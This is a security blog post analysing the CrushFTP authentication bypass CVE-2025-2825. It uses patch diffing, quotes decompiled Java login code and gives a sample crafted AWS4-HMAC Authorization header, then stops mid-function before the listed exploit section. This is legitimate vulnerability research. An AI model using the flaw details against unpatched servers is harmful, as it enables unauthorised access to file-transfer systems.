<!DOCTYPE html>
<html class="no-js" lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CVE 2025-2825 - CrushFTP Authentication Bypass Analysis - </title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="http://localhost:1313/posts/crushftp-cve-2025-2825/">
  <meta property="og:title" content="CVE 2025-2825 - CrushFTP Authentication Bypass Analysis">
  <meta property="og:description" content="After the news made it’s way to my feeds, having worked on the CrushFTP’s CVE-2024-4040 vulnerability analysis, this sounded like a good thing to do over and maybe I could write the exploit before anyone but unfortunately Project Discovery guys beat me to it. Anyways, enough story, let’s dive into the vulnerability:
CrushFTP versions 10.0.0 through 10.8.3 and 11.0.0 through 11.3.0 are affected by a vulnerability that may result in unauthenticated access. Remote and unauthenticated HTTP requests to CrushFTP server may allow attackers to gain unauthorized access.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-03-30T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-03-30T00:00:00+00:00">
    <meta property="article:tag" content="CVE-2025-2825">
    <meta property="article:tag" content="Java">
    <meta property="article:tag" content="Auth-Bypass">
    <meta property="article:tag" content="Logic-Flaw">

		
  <meta itemprop="name" content="CVE 2025-2825 - CrushFTP Authentication Bypass Analysis">
  <meta itemprop="description" content="After the news made it’s way to my feeds, having worked on the CrushFTP’s CVE-2024-4040 vulnerability analysis, this sounded like a good thing to do over and maybe I could write the exploit before anyone but unfortunately Project Discovery guys beat me to it. Anyways, enough story, let’s dive into the vulnerability:
CrushFTP versions 10.0.0 through 10.8.3 and 11.0.0 through 11.3.0 are affected by a vulnerability that may result in unauthenticated access. Remote and unauthenticated HTTP requests to CrushFTP server may allow attackers to gain unauthorized access.">
  <meta itemprop="datePublished" content="2025-03-30T00:00:00+00:00">
  <meta itemprop="dateModified" content="2025-03-30T00:00:00+00:00">
  <meta itemprop="wordCount" content="2034">
  <meta itemprop="keywords" content="CVE-2025-2825,Java,Auth-Bypass,Logic-Flaw">
		
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="CVE 2025-2825 - CrushFTP Authentication Bypass Analysis">
  <meta name="twitter:description" content="After the news made it’s way to my feeds, having worked on the CrushFTP’s CVE-2024-4040 vulnerability analysis, this sounded like a good thing to do over and maybe I could write the exploit before anyone but unfortunately Project Discovery guys beat me to it. Anyways, enough story, let’s dive into the vulnerability:
CrushFTP versions 10.0.0 through 10.8.3 and 11.0.0 through 11.3.0 are affected by a vulnerability that may result in unauthenticated access. Remote and unauthenticated HTTP requests to CrushFTP server may allow attackers to gain unauthorized access.">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo logo--mixed">
		<a class="logo__link" href="/" title="PwnFuzz" rel="home">
			<div class="logo__item logo__imagebox">
					<img class="logo__img" src="/img/pwnfuzz.png">
				</div><div class="logo__item logo__text">
					<div class="logo__title">PwnFuzz</div>
					<div class="logo__tagline">Fuzz. Pwn. Repeat.</div>
				</div>
		</a>
	</div>
		
<nav class="menu">
	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
		<span class="menu__btn-title" tabindex="-1">Menu</span>
	</button>
	<ul class="menu__list">
		<li class="menu__item">
			<a class="menu__link" href="/">
				
				<span class="menu__text">Home</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/about/">
				
				<span class="menu__text">About</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/tags/">
				
				<span class="menu__text">Tags</span>
				
			</a>
		</li>
	</ul>
</nav>

	</div>
</header>

		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">CVE 2025-2825 - CrushFTP Authentication Bypass Analysis</h1>
			<div class="post__meta meta">
<div class="meta__item-datetime meta__item">
	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0a14 14 0 1 1 0 28 1 1 0 0 1 0-28m0 3a3 3 0 1 0 0 22 3 3 0 0 0 0-22m1 4h-2v8.4l6.8 4.4L22 18l-6-3.8z"/></svg><time class="meta__text" datetime="2025-03-30T00:00:00Z">March 30, 2025</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2 1 2h8v11H0V2z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/cve-analysis/" rel="category">CVE Analysis</a>
	</span>
</div></div>
		</header>
		
<div class="post__toc toc">
	<div class="toc__title">Page content</div>
	<div class="toc__menu">
		<nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#inside-the-vulnerability-a-deep-dive">Inside the Vulnerability: A Deep Dive</a></li>
        <li><a href="#exploit-in-action-performing-auth-bypass">Exploit in Action: Performing Auth Bypass</a></li>
        <li><a href="#evaluating-patched-version">Evaluating Patched Version</a></li>
      </ul>
    </li>
  </ul>
</nav>
	</div>
</div><div class="content post__content clearfix">
			<p>After the <a href="https://thehackernews.com/2025/03/new-security-flaws-found-in-vmware.html">news</a> made it’s way to my feeds, having worked on the CrushFTP’s <a href="https://www.notion.so/CVE-2025-2825-1c553a570fe780998981fe4e2c1694e1?pvs=21">CVE-2024-4040</a> vulnerability analysis, this sounded like a good thing to do over and maybe I could write the exploit before anyone but unfortunately <a href="https://projectdiscovery.io/blog/crushftp-authentication-bypass">Project Discovery</a> guys beat me to it. Anyways, enough story, let’s dive into the vulnerability:</p>
<blockquote>
<p>CrushFTP versions 10.0.0 through 10.8.3 and 11.0.0 through 11.3.0 are affected by a vulnerability that may result in unauthenticated access. Remote and unauthenticated HTTP requests to CrushFTP server may allow attackers to gain unauthorized access.</p></blockquote>
<p>CrushFTP docker versions are the best source to achieve the specific version to analyze as the one listed within the CrushFTP website just points to latest release, since we need to perform patch diffing for the latest version (let’s say N) and previous version (N-1). The authentication bypass vulnerability was patched in <a href="https://www.crushftp.com/version11.html">11.3.1</a> of CrushFTP11, so we need 11.3.0 to perform the diffing of files and code changes made between these two.</p>
<h3 id="inside-the-vulnerability-a-deep-dive">Inside the Vulnerability: A Deep Dive</h3>
<p>Having both versions of docker image locally, we retrieve the <code>CrushFTP.jar</code> file, then as we do with all jar files, we decompile them and retrieve the Java files, once that is done, I quickly wrote a script to compare the MD5 checksums of files from the both versions and if they don’t match from the old one, it probably has been updated or created.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Function to calculate the MD5 checksum of a file</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calculate_md5</span>(file_path):
</span></span><span style="display:flex;"><span>    hash_md5 <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(file_path, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> chunk <span style="color:#f92672">in</span> iter(<span style="color:#66d9ef">lambda</span>: f<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">4096</span>), <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>):
</span></span><span style="display:flex;"><span>            hash_md5<span style="color:#f92672">.</span>update(chunk)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> hash_md5<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Function to find .java files and their MD5 checksums in a directory</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_java_files_with_md5</span>(directory):
</span></span><span style="display:flex;"><span>    java_files_md5 <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> root, dirs, files <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>walk(directory):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> files:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> file<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.java&#34;</span>):
</span></span><span style="display:flex;"><span>                file_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(root, file)
</span></span><span style="display:flex;"><span>                md5_checksum <span style="color:#f92672">=</span> calculate_md5(file_path)
</span></span><span style="display:flex;"><span>                relative_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>relpath(file_path, directory)  <span style="color:#75715e"># Get relative path</span>
</span></span><span style="display:flex;"><span>                java_files_md5[relative_path] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;md5&#34;</span>: md5_checksum,
</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;absolute_path&#34;</span>: file_path
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> java_files_md5
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Compare two directories</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">compare_directories</span>(dir1, dir2):
</span></span><span style="display:flex;"><span>    dir1_files_md5 <span style="color:#f92672">=</span> get_java_files_with_md5(dir1)
</span></span><span style="display:flex;"><span>    dir2_files_md5 <span style="color:#f92672">=</span> get_java_files_with_md5(dir2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    changed_files <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> file, data1 <span style="color:#f92672">in</span> dir1_files_md5<span style="color:#f92672">.</span>items():
</span></span><span style="display:flex;"><span>        data2 <span style="color:#f92672">=</span> dir2_files_md5<span style="color:#f92672">.</span>get(file)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> data2 <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>file<span style="color:#e6db74">}</span><span style="color:#e6db74"> is missing in </span><span style="color:#e6db74">{</span>dir2<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> data1[<span style="color:#e6db74">&#34;md5&#34;</span>] <span style="color:#f92672">!=</span> data2[<span style="color:#e6db74">&#34;md5&#34;</span>]:
</span></span><span style="display:flex;"><span>            changed_files<span style="color:#f92672">.</span>append(data1[<span style="color:#e6db74">&#34;absolute_path&#34;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> changed_files:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Changed files (absolute paths):&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> changed_files:
</span></span><span style="display:flex;"><span>            print(file)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;No Java files have changed between the two directories.&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Example usage:</span>
</span></span><span style="display:flex;"><span>directory2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./11.3.0&#34;</span>
</span></span><span style="display:flex;"><span>directory1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./11.3.1&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>compare_directories(directory1, directory2)
</span></span></code></pre></div><p>Running the script shows that there are couple of files that has been changed from the last version (N-1), knowing that this vulnerability exist for the HTTP service, the ServerSessions file stands out the most.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>Changed files (absolute paths)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">11.3.1</span><span style="color:#f92672">/</span>com<span style="color:#f92672">/</span>sshtools<span style="color:#f92672">/</span>sftp<span style="color:#f92672">/</span>SftpClient.java
</span></span><span style="display:flex;"><span>[..snip..]
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">11.3.1</span><span style="color:#f92672">/</span>crushftp<span style="color:#f92672">/</span>reports8<span style="color:#f92672">/</span>UserUsage.java
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">11.3.1</span><span style="color:#f92672">/</span>crushftp<span style="color:#f92672">/</span>server<span style="color:#f92672">/</span>VFS.java
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">11.3.1</span><span style="color:#f92672">/</span>crushftp<span style="color:#f92672">/</span>server<span style="color:#f92672">/</span>ServerSessionHTTP.java
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">11.3.1</span><span style="color:#f92672">/</span>crushftp<span style="color:#f92672">/</span>server<span style="color:#f92672">/</span>QuickConnect.java
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">11.3.1</span><span style="color:#f92672">/</span>crushftp<span style="color:#f92672">/</span>server<span style="color:#f92672">/</span>AdminControls.java
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">11.3.1</span><span style="color:#f92672">/</span>crushftp<span style="color:#f92672">/</span>server<span style="color:#f92672">/</span>ServerStatus.java
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">11.3.1</span><span style="color:#f92672">/</span>crushftp<span style="color:#f92672">/</span>server<span style="color:#f92672">/</span>ServerSessionFTP.java
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">11.3.1</span><span style="color:#f92672">/</span>crushftp<span style="color:#f92672">/</span>server<span style="color:#f92672">/</span>ServerSessionSSH.java
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">11.3.1</span><span style="color:#f92672">/</span>crushftp<span style="color:#f92672">/</span>server<span style="color:#f92672">/</span>LIST_handler.java
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">11.3.1</span><span style="color:#f92672">/</span>crushftp<span style="color:#f92672">/</span>server<span style="color:#f92672">/</span>ServerSessionAJAX.java
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">11.3.1</span><span style="color:#f92672">/</span>crushftp<span style="color:#f92672">/</span>handlers<span style="color:#f92672">/</span>JobScheduler.java
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">11.3.1</span><span style="color:#f92672">/</span>crushftp<span style="color:#f92672">/</span>handlers<span style="color:#f92672">/</span>PluginTools.java
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">11.3.1</span><span style="color:#f92672">/</span>crushftp<span style="color:#f92672">/</span>handlers<span style="color:#f92672">/</span>UserTools.java
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">11.3.1</span><span style="color:#f92672">/</span>crushftp<span style="color:#f92672">/</span>handlers<span style="color:#f92672">/</span>SessionCrush.java
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">11.3.1</span><span style="color:#f92672">/</span>crushftp<span style="color:#f92672">/</span>handlers<span style="color:#f92672">/</span>Common.java
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">11.3.1</span><span style="color:#f92672">/</span>crushftp<span style="color:#f92672">/</span>handlers<span style="color:#f92672">/</span>TaskBridge.java
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">11.3.1</span><span style="color:#f92672">/</span>crushftp<span style="color:#f92672">/</span>handlers<span style="color:#f92672">/</span>PreferencesProvider.java
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">11.3.1</span><span style="color:#f92672">/</span>crushftp<span style="color:#f92672">/</span>user<span style="color:#f92672">/</span>XMLUsers.java
</span></span></code></pre></div><p>Executing <code>diff</code> command on it will show the lines removed and added which will help in laying out the ground for us to work with.</p>
<p><img src="/img/crushftp-cve-2025-2825/image_0.png" alt="Untitled"></p>
<p>Out of all the additions and deletions, there are few things that stands out the most, the conditional check for the <code>login_user_pass</code> and how it has changed, looking into the <a href="http://ServerSessionHTTP.java"><code>ServerSessionHTTP.java</code></a> file, we see that the function named <code>loginCheckHeaderAuth</code> , this function parses the authorization header and validate if the requested methods and their respective values are valid or not. If we look closely at the conditional branch, first it checks if the <code>Authorization</code> header starts from <code>AWS4-HMAC</code> , it finds the <code>=</code> character and then it takes the value of it and removes the trailing <code>/</code> character to take it as username and most importantly it by default sets the value of <code>lookup_user_pass</code> as <code>true</code> , followed by the value set, it checks if the header value has a tilde character in it and if it is there, then it parses it and set the value of <code>login_user_pass</code> as <code>false</code> , followed by that it a <code>login_user_pass</code> lookup is done on the retrieved values from header with the <code>lookup_user_pass</code> , <code>user_name</code> and then  empty password as well. (The reason for empty password is the main part of vulnerability as we will be taking advantage of the missing check for the <code>lookup_user_pass</code> value correctly)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">loginCheckHeaderAuth</span>() <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">!</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">uiBG</span>(<span style="color:#e6db74">&#34;user_logged_in&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">uiSG</span>(<span style="color:#e6db74">&#34;user_name&#34;</span>).<span style="color:#a6e22e">equalsIgnoreCase</span>(<span style="color:#e6db74">&#34;anonymous&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">uiSG</span>(<span style="color:#e6db74">&#34;user_name&#34;</span>).<span style="color:#a6e22e">equalsIgnoreCase</span>(<span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">user</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">headerLookup</span>.<span style="color:#a6e22e">containsKey</span>(<span style="color:#e6db74">&#34;Authorization&#34;</span>.<span style="color:#a6e22e">toUpperCase</span>()) <span style="color:#f92672">||</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">headerLookup</span>.<span style="color:#a6e22e">containsKey</span>(<span style="color:#e6db74">&#34;Proxy-Authorization&#34;</span>.<span style="color:#a6e22e">toUpperCase</span>()) <span style="color:#f92672">||</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">headerLookup</span>.<span style="color:#a6e22e">containsKey</span>(<span style="color:#e6db74">&#34;as2-to&#34;</span>.<span style="color:#a6e22e">toUpperCase</span>()))) {
</span></span><span style="display:flex;"><span>         String authorization <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>         String s3_username;
</span></span><span style="display:flex;"><span>         String new_user_log_path;
</span></span><span style="display:flex;"><span>         String user_pass;
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">headerLookup</span>.<span style="color:#a6e22e">containsKey</span>(<span style="color:#e6db74">&#34;Authorization&#34;</span>.<span style="color:#a6e22e">toUpperCase</span>()) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">headerLookup</span>.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;Authorization&#34;</span>.<span style="color:#a6e22e">toUpperCase</span>()).<span style="color:#a6e22e">trim</span>().<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;AWS4-HMAC&#34;</span>)) {
</span></span><span style="display:flex;"><span>            s3_username <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">headerLookup</span>.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;Authorization&#34;</span>.<span style="color:#a6e22e">toUpperCase</span>()).<span style="color:#a6e22e">trim</span>();
</span></span><span style="display:flex;"><span>            s3_username <span style="color:#f92672">=</span> s3_username.<span style="color:#a6e22e">substring</span>(s3_username.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;=&#34;</span>) <span style="color:#f92672">+</span> 1);
</span></span><span style="display:flex;"><span>            s3_username <span style="color:#f92672">=</span> s3_username.<span style="color:#a6e22e">substring</span>(0, s3_username.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;/&#34;</span>));
</span></span><span style="display:flex;"><span>            user_pass <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>            String user_name <span style="color:#f92672">=</span> s3_username;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">boolean</span> lookup_user_pass <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (s3_username.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;~&#34;</span>) <span style="color:#f92672">&gt;=</span> 0) {
</span></span><span style="display:flex;"><span>               user_pass <span style="color:#f92672">=</span> s3_username.<span style="color:#a6e22e">substring</span>(s3_username.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;~&#34;</span>) <span style="color:#f92672">+</span> 1);
</span></span><span style="display:flex;"><span>               user_name <span style="color:#f92672">=</span> s3_username.<span style="color:#a6e22e">substring</span>(0, s3_username.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;~&#34;</span>));
</span></span><span style="display:flex;"><span>               lookup_user_pass <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>..<span style="color:#a6e22e">snip</span>..<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">login_user_pass</span>(lookup_user_pass, <span style="color:#66d9ef">false</span>, user_name, lookup_user_pass <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;&#34;</span> : user_pass)) {
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">if</span> (lookup_user_pass) {
</span></span><span style="display:flex;"><span>                  user_pass <span style="color:#f92672">=</span> com.<span style="color:#a6e22e">crushftp</span>.<span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">Common</span>.<span style="color:#a6e22e">encryptDecrypt</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;password&#34;</span>), <span style="color:#66d9ef">false</span>);
</span></span><span style="display:flex;"><span>               }
</span></span><span style="display:flex;"><span>               
</span></span></code></pre></div><p>Checking the <code>login_user_pass</code> function, it contains the login for authentication of how the username and password is handled, since with how the S3 authentication logic implemented, the expected values from the header have to contain the username and password along with other details like following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Authorization: AWS4<span style="color:#f92672">-</span>HMAC<span style="color:#f92672">-</span>SHA256 Credential<span style="color:#f92672">=</span>attacker<span style="color:#f92672">~</span>maliciouspassword<span style="color:#f92672">/</span>20240327<span style="color:#f92672">/</span>us<span style="color:#f92672">-</span>east<span style="color:#f92672">-</span>1<span style="color:#f92672">/</span>s3<span style="color:#f92672">/</span>aws4_request, SignedHeaders<span style="color:#f92672">=</span>host;x<span style="color:#f92672">-</span>amz<span style="color:#f92672">-</span>date, Signature<span style="color:#f92672">=</span>fakesignature
</span></span></code></pre></div><p>After some checks within the <code>login_user_pass</code> function whether it contains any specific keywords or not, since it does not matter to the flow we are following, we can move to the important line within this function which is the function call <code>this.verify_user</code> , our next target for analysis.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">login_user_pass</span>(<span style="color:#66d9ef">boolean</span> anyPass, <span style="color:#66d9ef">boolean</span> doAfterLogin, String user_name, String user_pass) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (user_name.<span style="color:#a6e22e">length</span>() <span style="color:#f92672">&lt;=</span> 2000) {
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">int</span> var10000 <span style="color:#f92672">=</span> user_pass.<span style="color:#a6e22e">length</span>();
</span></span><span style="display:flex;"><span>         ServerStatus var10001 <span style="color:#f92672">=</span> ServerStatus.<span style="color:#a6e22e">thisObj</span>;
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">if</span> (var10000 <span style="color:#f92672">&lt;=</span> ServerStatus.<span style="color:#a6e22e">IG</span>(<span style="color:#e6db74">&#34;max_password_length&#34;</span>) <span style="color:#f92672">||</span> user_name.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;SSO_OIDC_&#34;</span>) <span style="color:#f92672">||</span> user_name.<span style="color:#a6e22e">equalsIgnoreCase</span>(<span style="color:#e6db74">&#34;crush_oauth2&#34;</span>) <span style="color:#f92672">||</span> user_name.<span style="color:#a6e22e">equalsIgnoreCase</span>(<span style="color:#e6db74">&#34;crush_oauth2_ms&#34;</span>) <span style="color:#f92672">||</span> user_name.<span style="color:#a6e22e">equalsIgnoreCase</span>(<span style="color:#e6db74">&#34;crush_oauth2_azure_b2c&#34;</span>) <span style="color:#f92672">||</span> user_name.<span style="color:#a6e22e">equalsIgnoreCase</span>(<span style="color:#e6db74">&#34;crush_oauth2_cognito&#34;</span>)) {
</span></span><span style="display:flex;"><span>            Log.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;LOGIN&#34;</span>, 3, (Exception)(<span style="color:#66d9ef">new</span> Exception(LOC.<span style="color:#a6e22e">G</span>(<span style="color:#e6db74">&#34;INFO:Logging in with user:&#34;</span>) <span style="color:#f92672">+</span> user_name)));
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">uiPUT</span>(<span style="color:#e6db74">&#34;last_logged_command&#34;</span>, <span style="color:#e6db74">&#34;USER&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">boolean</span> stripped_char <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (user_name.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;!&#34;</span>)) {
</span></span><span style="display:flex;"><span>               user_name <span style="color:#f92672">=</span> user_name.<span style="color:#a6e22e">substring</span>(1);
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">uiPUT</span>(<span style="color:#e6db74">&#34;user_name&#34;</span>, user_name);
</span></span><span style="display:flex;"><span>               stripped_char <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>..<span style="color:#a6e22e">snip</span>..<span style="color:#f92672">]</span>
